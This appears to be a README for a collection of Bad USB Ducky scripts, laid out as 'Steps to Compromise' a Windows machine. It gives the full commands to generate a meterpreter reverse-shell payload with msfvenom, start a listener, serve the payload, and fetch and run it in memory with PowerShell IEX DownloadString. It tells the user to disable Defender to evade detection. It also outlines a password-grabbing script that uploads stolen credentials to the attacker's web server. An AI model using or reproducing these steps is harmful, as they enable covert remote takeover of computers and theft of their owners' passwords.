# **Various Ducky scripts for Bad USBs**

## **Steps to Compromise(StealthReverseShell.txt):** <br>
#### **Requires Admin privileges to disable Defender. Otherwise, the payload may be detected.**
1. Create the payload with msfvenom<br/> 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=AttacksersIP LPORT=AttackersPort -f psh -o PAYLOAD.ps1<br/>
2. Open msfconsole and start listener<br/>
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost IP; set lport PORT; set ExitOnSession false; exploit -j"<br/>
3. Start python http server<br/>
python3 -m http.server 80<br/>
4. Ducky script will download and execute payload session<br/>
IEX(New-Object System.Net.WebClient).DownloadString('http://IPADDR/PAYLOAD.ps1')

## Demonstration Video 
[![Click Me](https://img.youtube.com/vi/5RGWCgTj9_g/0.jpg)](https://www.youtube.com/watch?v=5RGWCgTj9_g)

## **Steps to Compromise(PassGrab.txt):** <br>
#### **Requires Admin privileges to disable Defender. Otherwise, the payload may be detected.**
1. Setup the web server.<br/> 
2. Replace the domain name with your own.<br/>
3. Setup php file to accept incoming upload requests.<br/>

## Demonstration Video 
[![Click Me](https://img.youtube.com/vi/IceMkFfI4fo/0.jpg)](https://www.youtube.com/watch?v=IceMkFfI4fo)
